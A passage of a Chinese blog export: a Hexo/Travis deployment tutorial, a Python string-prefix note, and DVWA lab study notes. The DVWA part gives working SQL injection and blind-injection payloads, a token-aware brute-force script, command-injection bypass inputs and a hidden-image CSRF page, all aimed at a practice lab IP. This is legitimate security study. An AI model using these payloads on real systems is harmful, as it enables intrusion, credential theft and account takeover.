开始写博客到现在我们可以开始写博客了。 1hexo new &quot;文章名&quot; 在博客的目录下，也就是myblog下，输入上述命名，可以在source/_post下生成文章名.md的文件，然后我们编辑该文件，书写文章就可以，markdown的语法网上有很多教程，百度一下学习吧。 每次写完之后，进行以下命令： 123hexo cleanhexo ghexo d 这样就可以将你的博客发布上去了。 配置trivas实现自动部署博客到github和coding我们在写博客的过程中，每次写了一篇文章后，就要执行重复的命令去将生成博客，然后推送到github和coding，并且我们也会需要将源码进行一个备份，如果我们备份在硬盘里，每次写完文章都需要去更新硬盘中的文件，会比较麻烦。下面我介绍通过trivas同时实现博客的备份和自动化部署。 首先我们在github中创建一个名为hexo-source的仓库。然后在本地执行以下命令。 12345git initgit add .git commit -m &quot;first commit&quot;git remote add origin https://github.com/overoptimus/hexo-source.git //这里要修改为你自己的仓库地址git push -u origin master 将本地的hexo源码推送到远端的仓库。 然后打开trivas官网。 通过github的账户进行登录，然后开启hexo-source的services integration服务。 点击setting添加Environment Variables，name可以自己命名，value添加github和coding生成的访问令牌，生成的位置github在settings-&gt;developer settings-&gt;personal access tokens，coding在个人设置-&gt;访问令牌。权限选择选择完整的仓库读写。 然后在本地的博客目录，即myblog下，创建.trivas.yml文件，内容如下。 123456789101112131415161718192021222324252627282930313233343536373839404142434445language: node_js # 设置语言node_js: stable # 设置相应版本cache: apt: true directories: - node_modules # 设置缓存，传说会在构建的时候快一些git: depth: 1 submodules: truebefore_install: - export TZ=&#x27;Asia/Shanghai&#x27; - npm install hexo-cli -ginstall: - npm install # 安装hexo及插件script: - hexo clean # 清除 - hexo g # 生成after_script: # - git clone https://$&#123;GH_REF&#125; pub_web # 因为我有两个仓库，先将发布服务的仓库clone下来， # - cp -rf public/* pub_web/ # 将源博客仓库(blog.git)目录下的public文件夹下的文件复制到发布服务的仓库(chenzhijun.github.com.git)中 # - cd pub_web # 进入到git仓库 - cd ./public - git init - git config user.name &quot;overoptimus&quot; - git config user.email &quot;1040570917@qq.com&quot; - git add . - git commit -am &quot;Travis CI Auto Builder :$(date &#x27;+%Y-%m-%d %H:%M:%S&#x27;)&quot; # 零时区，+8小时 - git push --force --quiet &quot;https://$&#123;GITHUB_TOKEN&#125;@$&#123;GH_REF&#125;&quot; master:master - git push --force --quiet &quot;https://EBlvrRYUzD:$&#123;CD_TOKEN&#125;@$&#123;CD_REF&#125;&quot; master:masterbranches: only: - master #只监测master分支,这是我自己的博客，所以就用的master分支了。env: global: - GH_REF: github.com/overoptimus/overoptimus.github.io.git #设置GH_REF，注意更改yourname,GITHUB_TOKEN:就是我们在travis-ci仓库中配置的环境变量 - GITHUB_TOKEN: &quot;$&#123;github_token&#125;&quot; - CD_REF: e.coding.net/overoptimus/overoptimus.git - CD_TOKEN: &quot;$&#123;cd_token&#125;&quot; 注意其中的一些位置要改成你自己的信息，特别注意在推送到coding的地址中https://后接的一串字符是在你创建coding的访问令牌时的页面中提示你的。且其中${xx_token}是与你在Environment Variable中的name是一致的。 现在设置已经完成，将本地的更改推送到远程仓库，然后就会在trivas的网站中发现，开始自动部署了。过一会儿你就访问你的博客，发现已经更新了。 然后你就会发现，你可以在任意的地方，即使没有git、node.js的环境，你在源码仓库进行更改并提交后，trivas就可以帮助你将更新后的内容同步到你的博客中。 写在后面现在你就可以很方便、优雅的书写自己的博客文章了，如果你并不喜欢butterfly这个主题，你也可以百度一下，寻找你自己的最爱。 希望这篇文章能够对你有所帮助。"},{"title":"python下r''、b''、f''、u''","date":"18/02/2020","path":"2020/02/18/20200218173211/","text":"r’’转义字符以原样输出，不做转义字符识别。如\\n，输出\\n，不是换行符。 1print(r&#x27;hahahahahahaha\\n&#x27;) 输出： 可以发现原样输出了\\n。 b’’这里有python2和python3的区别。 在python3中，字符串的类型有str和bytes。 1234567a = &#x27;111&#x27;type(a)# 输出strtype(a.encode())# 输出bytestype(a.decode())# 输出str没有decode的方法 在python2中，字符串的类型有str和unicode。 1234567a = &#x27;111&#x27;type(a)# 输出strtype(a.encode())# 输出strtype(a.decode())# 输出unicode 我们可以发现，python2中的str就是python3中的str.encode()后的，而python3中的str就是python2中str.decode()后的。也就是说，在两个版本中默认的str有如下关系。 因此，在python3中，b&#39;111&#39;等同于&#39;111&#39;.encode()。 u’’表示该字符串是unicode编码的，python3的默认编码方式就是unicode。 这里要说一下，unicode是一种标准，是字符集，符合这一标准的编码方式有utf-8、utf-16、utf-32等。 f’’格式化字符串的输入方式，见下面的例子。 12345a = &#x27;name&#x27;b = &#x27;0pt1mus&#x27;&#x27;my &#123;&#125; is &#123;&#125;&#x27;.format(a, b)f&#x27;my &#123;a&#125; is &#123;b&#125;&#x27; 上面的两种格式化字符串都没有问题，但f&#39;&#39;是不是更加方便呐。"},{"title":"DVWA学习笔记","date":"11/02/2020","path":"2020/02/11/20200211094241/","text":"sql injection：low首先，通过返回的报错信息判断是否存在注入点，并判断注入点的类型是数字型还是字符型。 12345678910# 判断注入可以直接输入&#39;或1’# 首先判断是否为数字型的1 and 1&#x3D;1 # 有返回1 and 1&#x3D;2 # 有返回# 证明该处的逻辑后台并没有进行处理# 测试字符型1&#39; and &#39;1&#39;&#x3D;&#39;1 # 有返回1&#39; and &#39;1&#39;&#x3D;&#39;2 # 无返回# 证明这里的逻辑后台处理了，因此判断该处为字符型注入 知道存在字符型注入点，现在要测试有几个字段，构造sql语句： 121&#39; order by 3;#1&#39; order by 2;# 通过二分法判断，最后得出查询的字段有两个。 接下来我们就可以通过联合查询来对这两个位置进行注入。 12# 查询数据库版本1&#39; union select 1,version();# 12# 查询数据库名1&#39; union select 1,database();# 12# 查询dvwa数据库的表名称1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;;# 12# 查询表users的列1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;;# 12# 查询user、password的内容1&#39; union select user,password from users;# Medium123456789101112131415161718192021222324252627282930&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_POST[ &#x27;id&#x27; ]; $id = mysql_real_escape_string( $id ); // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysql_query( $query ) or die( &#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i &lt; $num ) &#123; // Display values $first = mysql_result( $result, $i, &quot;first_name&quot; ); $last = mysql_result( $result, $i, &quot;last_name&quot; ); // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; // Increase loop count $i++; &#125; //mysql_close();&#125;?&gt; 观察页面，发现是通过下拉框来点击选择ID，我们有bp抓包，发现通过POST请求将ID传递给服务器，因此我们可以通过hack bar修改POST请求包进行注入。 源码发现中间通过函数mysql_real_escape_string()将特殊的字符全部转义了，所以我们可以通过十六进制绕过。 High1234567891011121314151617181920212223242526272829&lt;?phpif( isset( $_SESSION [ &#x27;id&#x27; ] ) ) &#123; // Get input $id = $_SESSION[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; $result = mysql_query( $query ) or die( &#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27; ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i &lt; $num ) &#123; // Get values $first = mysql_result( $result, $i, &quot;first_name&quot; ); $last = mysql_result( $result, $i, &quot;last_name&quot; ); // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; // Increase loop count $i++; &#125; mysql_close();&#125;?&gt; 可以发现在sql语句中添加了limit 1限制了返回的数据只有一条。我们可以在查询语句中通过将后面的语句注释掉来进行绕过。 这里提交sql语句和查询结果显示的界面不在一块，是为了防止一般的sqlmap注入。 Impossible123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $id = $_GET[ &#x27;id&#x27; ]; // Was a number entered? if(is_numeric( $id )) &#123; // Check the database $data = $db-&gt;prepare( &#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27; ); $data-&gt;bindParam( &#x27;:id&#x27;, $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) &#123; // Get values $first = $row[ &#x27;first_name&#x27; ]; $last = $row[ &#x27;last_name&#x27; ]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 首先添加了Anti-CSRF token，又对输入的id判断是否为数字，是数字才能进行下一步的操作，并且使用了PDO对sql语句进行了预编译。最后查询结果必须只有一条，才进行输出。 SQL Injection（Blind）lowSQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。 基本的盲注有时间盲注，bool盲注。 bool盲注：因为返回的只有是或否，所以我们可以通过bool值进行判断。 121&#39; and user()&#x3D;&#39;root@localhost&#39;;1&#39; and user() like &#39;ro%&#39;; 时间盲注：时间盲注中，我们通过判断返回的时候是否执行了函数sleep。我们通过if来进行判断，如果判断值为真，执行sleep函数，如果判断为假，不执行sleep函数。 12and if(ascii(mid(select group_concat(column_name) from information_schema.columns where table_schema &#x3D;0x73716C74657374 and table_name &#x3D;0x61646D696E), 1, 1)) &#x3D; 0,sleep(5),1); 拆解上面的sql语句，就是执行select语句，查询结果从第一个位置取其ascii码与0进行比较，若返回真，执行slee(5)，若返回假，返回1。 Brute Forcelow我们可以采用Burp suite抓包后，进行字典暴力破解。 可以根据返回的length进行判断，只有admin/password的长度和别的不同，打开发现，登录成功。 medium123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Sanitise username input $user = $_GET[ &#x27;username&#x27; ]; $user = mysql_real_escape_string( $user ); // Sanitise password input $pass = $_GET[ &#x27;password&#x27; ]; $pass = mysql_real_escape_string( $pass ); $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysql_query( $query ) or die( &#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) &#123; // Get users details $avatar = mysql_result( $result, 0, &quot;avatar&quot; ); // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; mysql_close();&#125;?&gt; 查看源码，发现函数mysql_real_escape_string()，作用是转义 SQL 语句中使用的字符串中的特殊字符（\\x00，\\n，\\r，\\，‘，“，\\x1a）。基本可以抵抗SQL注入。 并且在验证错误的时候，会sleep(2)睡眠两秒，但任然可以和low级一样，进行bp的爆破。 high123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpif( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Sanitise username input $user = $_GET[ &#x27;username&#x27; ]; $user = stripslashes( $user ); $user = mysql_real_escape_string( $user ); // Sanitise password input $pass = $_GET[ &#x27;password&#x27; ]; $pass = stripslashes( $pass ); $pass = mysql_real_escape_string( $pass ); $pass = md5( $pass ); // Check database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysql_query( $query ) or die( &#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) &#123; // Get users details $avatar = mysql_result( $result, 0, &quot;avatar&quot; ); // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; mysql_close();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; stripslashes():去除string中的反斜杠\\。 mysql_real_escape_string():转义 SQL 语句中使用的字符串中的特殊字符（\\x00，\\n，\\r，\\，‘，“，\\x1a）。 还用了Anti-CSRF token抵御CSRF。 然后我们再在网页的源码中发现隐藏的user_token。 我们尝试提交一次请求，发现url中含有参数user-token。 因此，判断该登录的逻辑为，后台通过generateSessionToken()产生token，然后传递到前端隐藏掉，在发起登录请求时，将user_token也传到后端，然后进行check，因此，爆破的时候不能再用bp进行。 通过python脚本来进行爆破，先请求服务器获得token，然后开始爆破。 1234567891011121314151617181920212223242526272829303132333435363738394041424344# 还可以将该脚本改成多线程的形式，加快速度from bs4 import BeautifulSoupimport requestsheader = &#123; &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;, &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;, &#x27;Accept-Language&#x27;: &#x27;zh,en;q=0.9,zh-CN;q=0.8&#x27;, &#x27;Cache-Control&#x27;: &#x27;no-cache&#x27;, &#x27;Connection&#x27;: &#x27;keep-alive&#x27;, &#x27;Cookie&#x27;: &#x27;security=high; PHPSESSID=364ucqbn2j1mucgtmkpes17fd1&#x27;, &#x27;Host&#x27;: &#x27;172.16.34.167&#x27;, &#x27;Pragma&#x27;: &#x27;no-cache&#x27;, &#x27;Referer&#x27;: &#x27;http://172.16.34.167/dvwa/vulnerabilities/brute/&#x27;, &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;, &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&#x27;&#125;requrl = &#x27;http://172.16.34.167/dvwa/vulnerabilities/brute/&#x27;def get_token(requrl, header): resp = requests.get(requrl, headers=header) print(resp.status_code, len(resp.content)) soup = BeautifulSoup(resp.content, &#x27;html.parser&#x27;) input = soup.select(&#x27;input[type=hidden]&#x27;) user_token = input[0][&#x27;value&#x27;] return user_tokenuser_token = get_token(requrl, header)i = 0with open(file=&#x27;/Users/optimus/tools/dict/passwords_quick.txt&#x27;, &#x27;r&#x27;) as f: for line in f.readlines(): requrl = &#x27;http://172.16.34.167/dvwa/vulnerabilities/brute/?username=admin&amp;password=&#x27; + \\ line + &#x27;&amp;Login=Login&amp;user_token=&#x27; + user_token i += 1 print(i, &#x27;admin&#x27;, line.strip(), end=&#x27; &#x27;) user_token = get_token(requrl, header) if(i == len(f.readlines())): break 运行结果： 通过返回长度，可以判断账号/密码:admin/password。 Impossible123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;?phpif( isset( $_POST[ &#x27;Login&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Sanitise username input $user = $_POST[ &#x27;username&#x27; ]; $user = stripslashes( $user ); $user = mysql_real_escape_string( $user ); // Sanitise password input $pass = $_POST[ &#x27;password&#x27; ]; $pass = stripslashes( $pass ); $pass = mysql_real_escape_string( $pass ); $pass = md5( $pass ); // Default values $total_failed_login = 3; $lockout_time = 15; $account_locked = false; // Check the database (Check user information) $data = $db-&gt;prepare( &#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27; ); $data-&gt;bindParam( &#x27;:user&#x27;, $user, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Check to see if the user has been locked out. if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &#x27;failed_login&#x27; ] &gt;= $total_failed_login ) ) &#123; // User locked out. Note, using this method would allow for user enumeration! //echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;; // Calculate when the user would be allowed to login again $last_login = $row[ &#x27;last_login&#x27; ]; $last_login = strtotime( $last_login ); $timeout = strtotime( &quot;&#123;$last_login&#125; +&#123;$lockout_time&#125; minutes&quot; ); $timenow = strtotime( &quot;now&quot; ); // Check to see if enough time has passed, if it hasn&#x27;t locked the account if( $timenow &gt; $timeout ) $account_locked = true; &#125; // Check the database (if username matches the password) $data = $db-&gt;prepare( &#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27; ); $data-&gt;bindParam( &#x27;:user&#x27;, $user, PDO::PARAM_STR); $data-&gt;bindParam( &#x27;:password&#x27;, $pass, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // If its a valid login... if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) &#123; // Get users details $avatar = $row[ &#x27;avatar&#x27; ]; $failed_login = $row[ &#x27;failed_login&#x27; ]; $last_login = $row[ &#x27;last_login&#x27; ]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; // Had the account been locked out since last login? if( $failed_login &gt;= $total_failed_login ) &#123; echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;; &#125; // Reset bad login count $data = $db-&gt;prepare( &#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27; ); $data-&gt;bindParam( &#x27;:user&#x27;, $user, PDO::PARAM_STR ); $data-&gt;execute(); &#125; else &#123; // Login failed sleep( rand( 2, 4 ) ); // Give the user some feedback echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;&quot;; // Update bad login count $data = $db-&gt;prepare( &#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27; ); $data-&gt;bindParam( &#x27;:user&#x27;, $user, PDO::PARAM_STR ); $data-&gt;execute(); &#125; // Set the last login time $data = $db-&gt;prepare( &#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27; ); $data-&gt;bindParam( &#x27;:user&#x27;, $user, PDO::PARAM_STR ); $data-&gt;execute();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 可以看到，Impossible在high的基础上，增加了登录失败次数的检测，登录失败次数超了3次，将会将账号锁定15秒。而且使用了PDO（PHP Data Object）机制来抵御SQL注入，PDO扩展已经封装了SQL的语句，没有办法打破SQL语句的结构来执行想要的结果，一次也避免了SQL注入。 Command Injectionlow这里我们要熟悉两种符号： 符号 含义 例子 ｜ 管道，将前面的输出作为后面的输入。 ls | more &amp; 前面一个执行完，执行后面的 ls &amp; cd .. &amp;&amp; 当前面的执行成功后才执行后面的，否则不再执行 touch 1.txt &amp;&amp; cat 1.txt ; 无论前一个执行完没有，后面的接着执行 ls ; cd .. 在这里，我们直接通过&amp;可以实现命令行注入。 127.0.0.1 &amp; dir Medium123456789101112131415161718192021222324252627282930&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; // Set blacklist $substitutions = array( &#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 分析源码，我们可以看到，将输入的&amp;&amp;和;都过滤掉了，因此无法用这两种符号来进行命令行注入。 但是我们还可以利用&amp;来进行注入。 输入：127.0.0.1&amp;dir 还有一种绕过方法是：127.0.0.1&amp;;&amp;net user。 因为会将;替换为空，因此输入变为了127.0.0.1&amp;&amp;net user。 high12345678910111213141516171819202122232425262728293031323334353637&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = trim($_REQUEST[ &#x27;ip&#x27; ]); // Set blacklist $substitutions = array( &#x27;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, &#x27;| &#x27; =&gt; &#x27;&#x27;, &#x27;-&#x27; =&gt; &#x27;&#x27;, &#x27;$&#x27; =&gt; &#x27;&#x27;, &#x27;(&#x27; =&gt; &#x27;&#x27;, &#x27;)&#x27; =&gt; &#x27;&#x27;, &#x27;`&#x27; =&gt; &#x27;&#x27;, &#x27;||&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 我们可以看到，这里过滤的符号更多。 123456789&#x27;&amp;&#x27; =&gt; &#x27;&#x27;,&#x27;;&#x27; =&gt; &#x27;&#x27;,&#x27;| &#x27; =&gt; &#x27;&#x27;,&#x27;-&#x27; =&gt; &#x27;&#x27;,&#x27;$&#x27; =&gt; &#x27;&#x27;,&#x27;(&#x27; =&gt; &#x27;&#x27;,&#x27;)&#x27; =&gt; &#x27;&#x27;,&#x27;`&#x27; =&gt; &#x27;&#x27;,&#x27;||&#x27; =&gt; &#x27;&#x27;, 这里进一步完善了黑名单，但是仔细观察可以发现，第三个| 是在竖线后面多了一个空格，所以我们依然可以绕过。 127.0.0.1|net user Impossible1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123; // If all 4 octets are int&#x27;s put the IP back together. $target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; else &#123; // Ops. Let the user name theres a mistake echo &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 分析源码： stripslashes():删除反斜杠\\。 explode():将字符串打散成列表。 可以发现添加了Anti-CSRF token，每次都会随机一个token和服务端check。 并且将输入的字符串通过.打散，然后判断列表的每一个元素是否为数字，若都为数字再组合成ip地址的形式。 因此不存在命令行注入。 CSRF(跨站请求伪造)low我们首先要了解CSRF具体指的是什么，我们可以理解为当用户A登录了网站B，攻击者C知道网站B的一项功能的请求url，那么攻击者A构造这一url，发送给用户A，用户A点击该链接，产生的行为就是在用户A未知的情况下，伪造A的身份进行的操作，可以是改密码，转账等敏感行为。 在实践中，我们使用的url为：http://172.16.34.167/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change 直接访问这个链接的话，很明显这个链接的目的是更改密码，因此我们可以用短链接的形式来隐藏真实的url。但是访问后，仍会显示更改密码成功后的页面，因此，我们可以构造一个exp页面来实现攻击。 123456789101112&lt;html&gt; &lt;head&gt; &lt;title&gt;404&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;img src=&quot;http://172.16.34.167/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change&quot; style=&quot;display:none;&quot;/&gt; &lt;h1&gt;404&lt;/h1&gt; &lt;h2&gt; file not found. &lt;/h2&gt; &lt;/body&gt;&lt;/html&gt; medium123456789101112131415161718192021222324252627282930313233343536&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Checks to see where the request came from if( eregi( $_SERVER[ &#x27;SERVER_NAME&#x27; ], $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ) ) &#123; // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysql_query( $insert ) or die( &#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Didn&#x27;t come from a trusted source echo &quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;; &#125; mysql_close();&#125;?&gt; 这里用eregi()比较$_SERVER[&#39;SERVER_NAME&#39;]和$_SERVER[&#39;HTTP_REFERER&#39;]是否相同，也就是判断request头中的referer中是否有host。若不同的话，不会进行之后的操作。 因此我们需要使来源网站包含目标ip，即172.16.34.167，所以我们将exp网页的名字改为172.16.34.167.html即可。 High1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysql_query( $insert ) or die( &#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; mysql_close();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 我们可以看到这里是添加了一个Anti-CSRF token，每次访问都会产生一个随机值，我们在更改密码时都需要提交这个随机值和服务器上的进行匹配。 之前找到的ifram获取token的方法，尝试之后发现因为同源策略的问题，没有办法获取到，因此需结合其他方法获得。 File Inclusionlow123456&lt;?php// The page we wish to display$file = 